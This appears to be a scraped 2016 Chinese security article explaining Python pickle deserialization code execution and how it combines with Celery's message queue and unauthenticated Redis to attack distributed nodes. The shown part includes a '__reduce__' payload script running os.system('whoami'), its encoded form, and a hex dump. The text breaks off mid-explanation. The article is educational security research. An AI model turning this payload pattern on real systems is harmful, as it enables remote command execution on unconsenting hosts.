<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】漏洞组合拳——攻击分布式节点 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="漏洞,攻击 分布式节点,异步处理,应用耦合,分布式系统"/>
    
        <meta name="description" content="分布式系统大都需要依赖于消息队列中间件来解决异步处理、应用耦合等问题，消息队列中间件的选择又依赖于整体系统的设计和实现，消息的封装、传递、处理贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】漏洞组合拳——攻击分布式节点</h2>
                <div class="article-msg">
                    <span class="time">2016-09-26 17:25:56</span>
                    
                                        <span class="read">阅读：17972次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3064"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3064" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2515404114" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2515404114" style="color:#848e99;">0keeTeam</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p0.qhimg.com/t01efc5e80a60c77c77.png" title="t01b4574aef53d7469a.png" alt="http://p4.qhimg.com/t01b4574aef53d7469a.png"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 18px;">作者：</span><span style="font-size: 16px;">RickGray</span></span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">分布式系统大都需要依赖于消息队列中间件来解决异步处理、应用耦合等问题，消息队列中间件的选择又依赖于整体系统的设计和实现，消息的封装、传递、处理贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">流行的开发语言几乎都存在序列化处理不当导致的命令执行问题，如 Python 里类的魔术方法 __reduce__() 会在 pickle 库进行反序列化的时候进行调用，PHP 中类的魔术方法 __wakup() 同样也会在实例进行反序列化的时候调用等等。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">从开发者角度看来，开发语言提供的数据序列化方式方便了实例对象进行跨应用传递，程序A 和 程序B 能够通过序列化数据传递方式来远程访问实例对象或者远程调用方法（如 Java 中的 RMI）；而站在安全研究者角度，这种跨应用的数据传递或者调用方式可能存在对象数据篡改和方法恶意调用的安全隐患。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在消息队列的实现中，消息数据的序列化（封装）方式就成了一颗定时炸弹，不安全的序列化方式可能会导致消息数据被篡改，从而引发反序列化（数据解析）后的一些列安全问题。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">消息队列中间件的选择也是一大问题，常见的有 RabbitMQ，ActiveMQ，Kafka，Redis 等，而像 Redis 这种存在未授权访问问题的组件如果被攻击者所控制，即可通过组件直接向消息队列中插入数据，轻则影响整个分布式节点的逻辑处理，重则直接插入恶意数据结合反序列化等问题对节点群进行攻击。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">说了这么多，总结一下上面提到的几个安全问题：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1、各语言中存在的序列化问题可直接导致远程命令执行；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2、消息队列的实现常常会直接使用语言自身的序列化（或相似的）方式封装消息；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3、分布式系统使用的消息队列中间件种类繁多，其中某些分布式框架使用了像 Redis 这种存在着未授权访问问题的组件；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4、消息队列中消息的篡改会直接或间接影响到分布式节点；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">将这 4 个安全问题或者说是漏洞结合在一起，即可成为一种可直接入侵和破坏分布式节点的攻击方法。那么，是否存在真正满足上述问题的实例呢？目前，已经发现了 Python 中 Celery 分布式框架确实存在这样的问题，下面我会针对上诉 4 个问题以 Celery 分布式框架为例来说明如何攻击分布式节点打出漏洞组合拳。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><strong>老生常谈 Python 序列化</strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Celery 分布式框架是由 Python 语言所编写的，为了下面更好的说明问题，所以这里首先简单的回顾一下 Python 序列化的安全问题。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">1. 简单的序列化例子</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Python 中有这么一个名为&nbsp;pickle&nbsp;的模块用于实例对象的序列化和反序列化，一个简单的例子：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"></span></p><pre class="brush:plain;toolbar:false">import&nbsp;base64
import&nbsp;pickle
class&nbsp;MyObj(object):
&nbsp;&nbsp;&nbsp;&nbsp;loa&nbsp;=&nbsp;&#39;hello&nbsp;my&nbsp;object&#39;
t_obj&nbsp;=&nbsp;MyObj()
serialized&nbsp;=&nbsp;base64.b64encode(pickle.dumps(t_obj))
print(&#39;--&amp;gt;&nbsp;pickling&nbsp;MyObj&nbsp;instance&nbsp;{}&nbsp;and&nbsp;Base64&nbsp;it\ngot&nbsp;&quot;{}&quot;&#39;.format(t_obj,&nbsp;serialized))
print(&#39;--&amp;gt;&nbsp;unpickling&nbsp;serialized&nbsp;data\nwith&nbsp;&quot;{}&quot;&#39;.format(serialized))
obj&nbsp;=&nbsp;pickle.loads(base64.b64decode(serialized))
print(&#39;**&nbsp;unpickled&nbsp;object&nbsp;is&nbsp;{}&#39;.format(obj))
print(&#39;{}&nbsp;-&amp;gt;&nbsp;loa&nbsp;=&nbsp;{}&#39;.format(obj,&nbsp;obj.loa))</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">因 pickle 模块对实例对象进行序列化时产生的是二进制结构数据，传输的时候常常会将其进行 Base64 编码，这样可以有效地防止字节数据丢失。上面的程序作用是将一个 MyObj 类实例进行序列化并进行 Base64 编码然后进行解码反序列化重新得到实例的一个过程，运行程序后得到输出：</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"><br/></span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/1-241" rel="attachment wp-att-89645"><img src="http://p5.qhimg.com/t01a9f41896bd0de677.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过截图可以看到序列化前和序列化后的实例是不同的（对象地址不同），并且通常反序列化时实例化一个类实例，当前的运行环境首先必须定义了该类型才能正常序列化，否则可能会遇到找不到正确类型无法进行反序列化的情况，例如将上诉过程分文两个文件 serializer.py 和 unserializer.py，前一个文件用于实例化 MyObj 类并将其序列化然后经 Base64 编码输出，而后一个文件用于接收一串字符串，将其 Base64 解码后进行反序列化：</span></p><pre class="brush:plain;toolbar:false">#&nbsp;serializer.py
import&nbsp;base64
import&nbsp;pickle
class&nbsp;MyObj(object):
&nbsp;&nbsp;&nbsp;&nbsp;loa&nbsp;=&nbsp;&#39;hello&nbsp;my&nbsp;object&#39;
print(base64.b64encode(pickle.dumps(MyObj())))</pre><pre class="brush:plain;toolbar:false">#&nbsp;unserializer.py
import&nbsp;sys
import&nbsp;base64
import&nbsp;pickle
print(pickle.loads(base64.b64decode(sys.argv[1])))</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">就上面所说，在反序列化时如果环境中不存在反序列化类型的定义，因为 unserializer.py 中未定义 MyObj 类，则在对 serializer.py 输出结果进行反序列化时会失败报错，提示找不到 MyObj：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/2-229" rel="attachment wp-att-89646"><img src="http://p1.qhimg.com/t01dbecd056242876b7.png"/></a></p><p style="text-indent: 2em; text-align: left;"><strong style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. Trick 使得反序列化变得危险</span></strong><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">看似反序列化并不能实例化任意对象（运行环境依赖），但有那么些 tricks 可以达到进行反序列化即可任意代码执行的效果。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果一个类定义了 __reduce__() 函数，那么在对其实例进行反序列化的时候，pickle 会通过 __reduce__() 函数去寻找正确的重新类实例化过程。（__reduce__() 函数</span><a href="https://docs.python.org/2/library/pickle.html#object.__reduce__" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">详细文档参考</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">例如这里我在 MyObj 类中定义 __reduce__() 函数：</span></p><pre class="brush:plain;toolbar:false">...class&nbsp;MyObj(object):&nbsp;&nbsp;&nbsp;&nbsp;loa&nbsp;=&nbsp;&#39;hello&nbsp;my&nbsp;object&#39;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__reduce__(self):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(str,&nbsp;(&#39;replaced&nbsp;by&nbsp;__reduce__()&nbsp;method&#39;,&nbsp;))...</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">然后再执行上一节的程序过程，会直接得到输出：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/3-198" rel="attachment wp-att-89647"><img src="http://p3.qhimg.com/t0112505220d653d37d.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里不再报错是因为，MyObj 在进行序列化的时候，将重新构建类的过程写进了序列化数据里，pickle 在进行反序列化的时候会遵循重建过程去执行相应操作，这里是使用内置的 str 函数去操作参数 ‘replaced by __reduce__() method’ 并返回，所以成功反序列化并输出的字符串。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">有了&nbsp;__reduce__()&nbsp;这个函数，就可以利用该特性在反序列化的时候直接执行任意代码了，如下示例代码：</span></p><pre class="brush:plain;toolbar:false">#&nbsp;evil.py
import&nbsp;os
import&nbsp;base64
import&nbsp;pickle
class&nbsp;CMD(object):
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__reduce__(self):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(os.system,&nbsp;(&#39;whoami&#39;,&nbsp;))
print(base64.b64encode(pickle.dumps(CMD())))</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">运行得到编码后的序列化数据：</span></p><pre class="brush:plain;toolbar:false">Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里需要主要的是 os.system(‘whoami’) 这个过程不是在序列化过程执行的，而是将这个过程以结构化的数据存于了序列化数据中，这里可以看一下二进制序列化数据：</span></p><pre class="brush:plain;toolbar:false">➜&nbsp;&nbsp;demo&nbsp;echo&nbsp;-n&nbsp;&quot;Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==&quot;&nbsp;|&nbsp;base64&nbsp;-D&nbsp;|&nbsp;xxd
0000000:&nbsp;6370&nbsp;6f73&nbsp;6978&nbsp;0a73&nbsp;7973&nbsp;7465&nbsp;6d0a&nbsp;7030&nbsp;&nbsp;cposix.system.p0
0000010:&nbsp;0a28&nbsp;5327&nbsp;7768&nbsp;6f61&nbsp;6d69&nbsp;270a&nbsp;7031&nbsp;0a74&nbsp;&nbsp;.(S&#39;whoami&#39;.p1.t
0000020:&nbsp;7032&nbsp;0a52&nbsp;7033&nbsp;0a2e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p2.Rp3..
➜&nbsp;&nbsp;demo</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">数据都是以 Python pickle 序列化数据结构进行整合的，具体底层协议实现可参考官方文档。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对上面的序列化数据使用 unserializer.py 进行反序列化操作时，会触发类重构操作，从何执行 os.system(‘whoami’)：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/4-174" rel="attachment wp-att-89648"><img src="http://p6.qhimg.com/t016aaecbf3f8be84bd.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">历史上框架或者应用由于 Python 反序列化问题导致的任意命令执行并不少见，如 Django 低版本使用了 pickle 作为 Session 数据默认的序列化方式，在设置了使用 Cookie 进行 Session 数据存储的时候，会使得攻击者直接构造恶意 Cookie 值，触发恶意的反序列化进行任意命令执行；又一些程序可接受一串序列化数据作为输入，如 SQLMAP 之前的 –pickled-options 运行参数就可以传入由 pickle 模块序列化后的数据。虽然官方有对 pickle 模块进行安全声明，指明了不要反序列化未受信任的数据来源，但是现实应用逻辑繁杂，常会有这样的数据可控的点出现，也是不太好避免的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">分布式框架 Celery</span></strong></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">回顾完 Python 序列化的问题，这时候转过来看一下 Celery 这个分布式框架。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. 使用框架进行简单的任务下发</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Celery 借助消息队列中间件进行消息（任务）的传递，一个简单利用 Celery 框架进行任务下发并执行的例子：</span></p><pre class="brush:plain;toolbar:false">#&nbsp;celery_simple.py
from&nbsp;celery&nbsp;import&nbsp;Celery
app&nbsp;=&nbsp;Celery(&#39;demo&#39;,&nbsp;broker=&#39;amqp://192.168.99.100//&#39;,&nbsp;backend=&#39;amqp://192.168.99.100//&#39;)
@app.task
def&nbsp;add(x,&nbsp;y):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;x&nbsp;+&nbsp;y</pre><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Celery 推荐使用 RabbitMQ 作为 Broker，这里直接在&nbsp;</span><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">192.168.99.100</span><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;主机上开启 RabbitMQ 服务，然后在终端使用 celery 命令起一个 worker：</span></p><pre class="brush:plain;toolbar:false">celery&nbsp;worker&nbsp;-A&nbsp;celery_simple.app&nbsp;-l&nbsp;DEBUG</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后另起一个 ipython 导入&nbsp;celery_simple&nbsp;模块中的&nbsp;add()&nbsp;函数，对其进行调用并获取结果：</span></p><pre class="brush:plain;toolbar:false">In&nbsp;[1]:&nbsp;from&nbsp;celery_simple&nbsp;import&nbsp;add
In&nbsp;[2]:&nbsp;task&nbsp;=&nbsp;add.apply_async((4,&nbsp;5))
In&nbsp;[3]:&nbsp;task.result
Out[3]:&nbsp;9</pre><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/5-159" rel="attachment wp-att-89649"><img src="http://p7.qhimg.com/t01042845539e49f3f1.png"/></a></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. 框架中的消息封装方式</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">本文并不关心框架的具体实现和用法，只关心消息的具体封装方式。在 Celery 框架中有多种可选的消息序列化方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">pickle</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">json</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">msgpack</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">yaml</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">…</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到 Celery 框架所使用的消息序列化方式中含有 pickle 的序列化方式，上一部分已经说明了 Python 中 pickle 序列化方式存在的安全隐患，而 Celery 框架却支持这种方式对消息进行封装，并且在 4.0.0 版本以前默认使用的也是 pickle 序列化方式。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为了弄明白 Celery 的消息格式，这里将 Broker 换成 Redis 方便直接查看数据。</span></p><pre class="brush:plain;toolbar:false">#&nbsp;celery_simple.py
from&nbsp;celery&nbsp;import&nbsp;Celery
app&nbsp;=&nbsp;Celery(&#39;demo&#39;,&nbsp;broker=&#39;redis://:@192.168.99.100:6379/0&#39;,&nbsp;backend=&#39;redis://:@192.168.99.100:6379/0&#39;)
@app.task
def&nbsp;add(x,&nbsp;y):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;x&nbsp;+&nbsp;y</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里先不起 worker 进程，直接使用 ipython 进行任务下发：</span></p><pre class="brush:plain;toolbar:false">In&nbsp;[1]:&nbsp;from&nbsp;celery_simple&nbsp;import&nbsp;addIn&nbsp;[2]:&nbsp;task&nbsp;=&nbsp;add.apply_async((4,&nbsp;9))</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这时候查看 Redis 里面的数据：</span><br/></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/6-144" rel="attachment wp-att-89652"><img src="http://p2.qhimg.com/t01f65f30ab436b5b65.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到 Redis 里面存在两个键，celery 和 _kombu.binding.celery，这里解释一下具体两个键的具体含义。在 Celery 中消息可以根据路由设置分发到不同的任务上，例如这里 add() 函数由于没有进行特别的设置，所以其所处的消息队列为名为 celery 的队列，exchange 和 routing_key 值都为 celery，所有满足路由（{“queue”:”celery”,”exchange”:”celery”,”routing_key”:”celery”}）的消息都会发到该 worker 上，然后 worker 